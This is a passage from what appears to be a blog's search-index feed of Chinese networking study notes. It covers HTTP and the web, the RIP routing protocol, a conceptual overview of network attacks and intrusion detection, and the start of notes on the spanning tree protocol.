href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li><p>URL由4部分组成:</p><ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p>首部行</p><ul><li>用来说明浏览器、服务器或报文主体的一些信息。</li><li>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</li><li>首部可以有好几行，但也可以不使用。</li><li>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</li></ul></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/万维网工作过程.png" style="zoom:67%;" /><h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/触发更新.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻击与防范</title>
      <link href="/2022/11/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
      <url>/2022/11/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<h2 id="网络攻击与防范"><a href="#网络攻击与防范" class="headerlink" title="网络攻击与防范"></a>网络攻击与防范</h2><p>[TOC]</p><h3 id="网络攻击概述"><a href="#网络攻击概述" class="headerlink" title="网络攻击概述"></a>网络攻击概述</h3><blockquote><p style="color:blue;">任何在非授权的情况下，试图存取信息、处理信息或破坏网络系统以使系统不可靠、不可用的故意行为都被称为网络攻击</p></blockquote><h3 id="常见网络攻击"><a href="#常见网络攻击" class="headerlink" title="常见网络攻击"></a>常见网络攻击</h3><p>常见的网络攻击类型有：拒绝服务攻击，利用型攻击，信息收集型攻击，虚假信息型攻击 </p><h4 id="拒绝服务型攻击"><a href="#拒绝服务型攻击" class="headerlink" title="拒绝服务型攻击"></a>拒绝服务型攻击</h4><blockquote><p style="color:orange;">拒绝服务攻击（Denial of Service, DoS）利用TCP/IP协议本身的漏洞或网络中操作系统漏洞，让被攻击主机无法响应正常的用户请求而实现的</p></blockquote><ul><li>在DoS攻击中，攻击者加载过多的服务将系统，使得没有多余资源供其他用户使用。</li></ul><h5 id="分布式拒绝服务攻击"><a href="#分布式拒绝服务攻击" class="headerlink" title="分布式拒绝服务攻击:"></a>分布式拒绝服务攻击:</h5><blockquote><p style="color:orange;">分布式拒绝服务攻击（Distributed Denial of Service, DDoS）是一种基于DoS攻击、但形式特殊的拒绝服务攻击，采用一种分布、协作的大规模攻击方式</p></blockquote><ul><li>DDoS攻击是利用一批受控制的主机向一台主机发起攻击，其攻击的强度和造成的威胁要比DoS攻击严重得多</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/30/子域名深度挖掘/分布式拒绝服务攻击.png" style="zoom: 50%;" /><h4 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h4><p>缓冲区溢出攻击是一种常见且危害很大的系统攻击手段，攻击者向一个有限空间的缓冲区中复制过长的字符串，可能产生两种结果：</p><ol><li>过长的字符串覆盖了相邻的存储单元而造成程序瘫痪，甚至造成系统崩溃</li><li>攻击者运行恶意代码，执行任意指令，甚至获得管理员用户的权限等</li></ol><h5 id="缓冲区溢出攻击的防范"><a href="#缓冲区溢出攻击的防范" class="headerlink" title="缓冲区溢出攻击的防范"></a>缓冲区溢出攻击的防范</h5><ul><li>编写正确的代码</li><li>非执行缓冲区保护</li><li>数组边界检查</li><li>程序指针完整性检查</li></ul><h3 id="入侵检测概述"><a href="#入侵检测概述" class="headerlink" title="入侵检测概述"></a>入侵检测概述</h3><h4 id="传统安全技术的局限性"><a href="#传统安全技术的局限性" class="headerlink" title="传统安全技术的局限性"></a>传统安全技术的局限性</h4><ol><li><strong>传统的安全技术</strong>采用严格的访问控制和数据加密策略来防护</li><li>大部分损失是由内部引起的，而传统安全技术难于防内</li><li>传统的安全技术基本上是一种<strong>被动的防护</strong>，而如今的攻击和入侵要求我们主动地去检测、发现和排除安全隐患</li></ol><h4 id="入侵检测系统概述"><a href="#入侵检测系统概述" class="headerlink" title="入侵检测系统概述"></a>入侵检测系统概述</h4><p><strong>入侵（Intrusion）</strong></p><p>企图进入或滥用计算机或网络系统的行为，可能来自于网络内部的合法用户，或网络外部的非法用户</p><p><strong>入侵检测（Intrusion Detection）</strong></p><blockquote><p style="color:blue;">入侵检测系统的定义:对系统的运行状态进行监视，发现各种攻击企图、攻击行为或者攻击结果，以保证系统资源的机密性、完整性和可用性</p></blockquote><p><strong>入侵检测系统（Intrusion Detection System， IDS）</strong></p><blockquote><ul><li><p style="color:blue;">定义：进行入侵检测的软件与硬件的组合便是入侵检测系统</p></li></ul></blockquote><blockquote><ul><li><p style="color:blue;">功能：监控计算机系统或网络系统中发生的事件，根据规则进行安全审计</p></li><li><p style="color:orange;">通过从计算机网络或计算机系统的关键点收集信息并进行分析，从中发现网络或系统中是否有违反安全策略的行为和被攻击的迹象</p></li></ul></blockquote><h5 id="入侵检测相关术语"><a href="#入侵检测相关术语" class="headerlink" title="入侵检测相关术语:"></a>入侵检测相关术语:</h5><p>Promiscuous 混杂模式，即IDS网络接口可以看到网段中所有的网络通信量，不管其来源或目的地<br>Signatures 特征，即攻击的特征，Alerts 警告，Anomaly 异常，Console 控制台，Sensor 传感器，即检测引擎</p><h3 id="入侵检测系统"><a href="#入侵检测系统" class="headerlink" title="入侵检测系统"></a>入侵检测系统</h3><p>按系统各模块的运行方式</p><ol><li>集中式：系统的各个模块包括数据的收集分析集中在一台主机上运行</li><li>分布式：系统的各个模块分布在不同的计算机和设备上</li></ol><p>根据时效性</p><ol><li>脱机分析：行为发生后，对产生的数据进行分析</li><li>联机分析：在数据产生的同时或者发生改变时进行分析</li></ol><h5 id="基于主机的入侵检测系统"><a href="#基于主机的入侵检测系统" class="headerlink" title="基于主机的入侵检测系统"></a>基于主机的入侵检测系统</h5><p>基于主机的入侵检测系统: Host-Based IDS(HIDS)<br>系统安装在主机上面，对本主机进行安全检测</p><ul><li><p>优点</p><ul><li>审计内容全面，保护更加周密；视野集中；适用于加密及交换环境；易于用户自定义；对网络流量不敏感</li></ul></li><li><p>缺点</p><ul><li>额外产生的安全问题；HIDS依赖性强；如果主机数目多，代价过大；不能监控网络上的情况</li></ul></li></ul><h5 id="基于网络的入侵检测系统"><a href="#基于网络的入侵检测系统" class="headerlink" title="基于网络的入侵检测系统"></a>基于网络的入侵检测系统</h5><p>基于网络的入侵检测系统：Network-Based IDS(NIDS)</p><blockquote><p style="color:blue;">系统安装在比较重要的网段内，在共享网段上对通信数据进行侦听采集数据</p></blockquote><p>优点：检测范围广，提供对网络通用的保护；无需改变主机配置和性能，安装方便；独立性，操作系统无关性；侦测速度快； 隐蔽性好 ；较少的监测器，占资源少</p><p>缺点：不能检测不同网段的网络包；很难检测复杂的需要大量计算的攻击；协同工作能力弱；难以处理加密的会话 </p><blockquote><p>入侵检测系统包括三个功能部件：<strong>信息收集</strong>，<strong>信息分析</strong>，<strong>结果处理</strong></p></blockquote><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><blockquote><p style="color:blue;">入侵检测的第一步是信息收集，收集内容包括系统、网络、数据及用户活动的状态和行为</p></blockquote><ol><li>尽可能扩大检测范围：需要在计算机网络系统中的若干不同关键点（不同网段和不同主机）收集信息</li><li>要保证用来检测网络系统的软件的完整性：特别是入侵检测系统软件本身应具有相当强的坚固性，防止被篡改而收集到错误的信息 </li><li>信息收集的来源：系统或网络的日志文件，网络流量，系统目录和文件的异常变化，程序执行中的异常行为</li></ol><h4 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h4><p>分析得到的数据，并产生分析结果</p><ul><li><strong>模式匹配</strong>：将收集到的信息与已知的网络入侵和系统误用模式数据库进行比较，从而发现违背安全策略的行为</li><li><strong>统计分析</strong>：首先给系统对象创建一个统计描述，统计正常使用时的一些测量属性（如访问次数、操作失败次数和延时等）。测量属性的平均值和偏差将被用来与网络、系统的行为进行比较，任何观察值在正常值范围之外时，就认为有入侵发生</li><li><strong>完整性分析</strong>：事后分析，主要关注某个文件或对象是否被更改</li></ul><p>入侵检测的分析方式：异常检测（Anomaly Detection），误用检测（Misuse Detection），完整性分析</p><h5 id="异常检测："><a href="#异常检测：" class="headerlink" title="异常检测："></a>异常检测：</h5><p>建立正常行为的特征轮廓，检查系统的运行情况</p><ul><li><p>优点</p><blockquote><p>可以检测到未知的入侵,可以检测冒用他人帐号的行为,具有自适应，自学习功能，不需要系统先验知识</p></blockquote></li><li><p>缺点</p><blockquote><p>漏报、误报率高，入侵者可以逐渐改变自己的行为模式来逃避检测，合法用户正常行为的突然改变也会造成误警，统计算法的计算量庞大，效率很低，统计点的选取和参考库的建立比较困难</p></blockquote></li></ul><h5 id="误用检测"><a href="#误用检测" class="headerlink" title="误用检测"></a>误用检测</h5><p>提前建立已出现的入侵行为特征，检测当前用户行为特征，模式匹配</p><ul><li>优点<ul><li>算法简单，系统开销小，准确率高，效率高</li></ul></li><li>缺点<ul><li>被动，只能检测出已知攻击，新类型的攻击会对系统造成很大的威胁，模式库的建立和维护难，模式库要不断更新，知识依赖于硬件平台、操作系统和系统中运行的应用程序</li></ul></li></ul><h5 id="完整性分析"><a href="#完整性分析" class="headerlink" title="完整性分析"></a>完整性分析</h5><p>通过检查系统的当前系统配置，诸如系统文件的内容或者系统表，来检查系统是否已经或者可能会遭到破坏 </p><ul><li>优点 ：不管模式匹配方法和统计分析方法能否发现入侵，只要是成功的攻击导致了文件或其它对象的任何改变，它都能够发现</li><li>缺点：一般以批处理方式实现，不用于实时响应</li></ul><h4 id="结果处理"><a href="#结果处理" class="headerlink" title="结果处理"></a>结果处理</h4><p>结果处理，即对分析结果作出反应。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/30/子域名深度挖掘/入侵检测系统组成.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/30/子域名深度挖掘/入侵检测引擎工作流程.png" style="zoom: 50%;" /><center>入侵检测引擎工作流程</center>#### IDS标准化要求<p>目前网络的安全也要求IDS能够与访问控制、应急、入侵追踪等系统交换信息，相互协作，形成一个整体有效的安全保障系统</p><h5 id="CIDF"><a href="#CIDF" class="headerlink" title="CIDF"></a>CIDF</h5><p>The Common Intrusion Detection Framework, CIDF<br>CIDF是一套规范，它定义了IDS表达检测信息的标准语言以及IDS组件之间的通信协议<br>符合CIDF规范的IDS可以共享检测信息，相互通信，协同工作，还可以与其它系统配合实施统一的配置响应和恢复策略<br>CIDF的主要作用在于集成各种IDS使之协同工作，实现各IDS之间的组件重用，所以CIDF也是构建分布式IDS的基础</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/30/子域名深度挖掘/CIDF的体系结构示意图.png" style="zoom: 50%;" /><center>CIDF的体系结构示意图</center>### 计算机紧急响应 <blockquote><p>紧急响应服务能够在安全事件发生时进行紧急援助，避免造成更大的损失</p></blockquote><ul><li>应急响应的工作过程：准备，事件检测，抑制，根除，恢复，报告 </li></ul><h4 id="蜜罐技术"><a href="#蜜罐技术" class="headerlink" title="蜜罐技术"></a>蜜罐技术</h4><blockquote><p>蜜罐（HoneyPot）系统是试图将攻击从关键系统引诱开并能记录其一举一动的诱骗系统</p><ul><li>当检测到对蜜罐系统的访问时，很可能就有攻击者闯入</li><li>蜜罐系统的另一个目的是诱惑攻击者在该系统上浪费时间，以延缓对真正目标的攻击</li></ul></blockquote><h4 id="蜜罐的功能"><a href="#蜜罐的功能" class="headerlink" title="蜜罐的功能"></a>蜜罐的功能</h4><ol><li>转移攻击重要系统的攻击者</li><li>收集攻击者活动的信息</li><li>希望攻击者在系统中逗留足够的时间，使管理员能对此攻击做出响应。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生成树协议</title>
      <link href="/2022/11/21/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/21/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a>生成树协议</h2><p>[TOC]</p><h3 id="生成树技术概述："><a href="#生成树技术概述：" class="headerlink" title="生成树技术概述："></a>生成树技术概述：</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>以太网交换网络中为了进行链路备份，提高网络可靠性，通常会使用冗余链路。但是使用冗余链路会在交换网络上产生环路，引发广播风暴以及MAC地址表不稳定等故障现象，从而导致用户通信质量较差，甚至通信中断。为解决交换网络中的环路问题，提出了生成树协议STP（Spanning Tree Protocol）。</p><p>运行STP协议的设备通过彼此交互信息发现网络中的环路，并有选择的对某个接口进行阻塞，最终将环形网络结构修剪成无环路的树形网络结构，从而防止报文在环形网络中不断循环，避免设备由于重复接收相同的报文造成处理能力下降。</p><blockquote><p style="color:orange;">RSTP(Rapid Spanning Tree Protocol)协议：快速生成树协议，基于STP协议，实现了网络拓扑快速收敛</p></blockquote><h4 id="二层交换机网络的冗余性与环路"><a href="#二层交换机网络的冗余性与环路" class="headerlink" 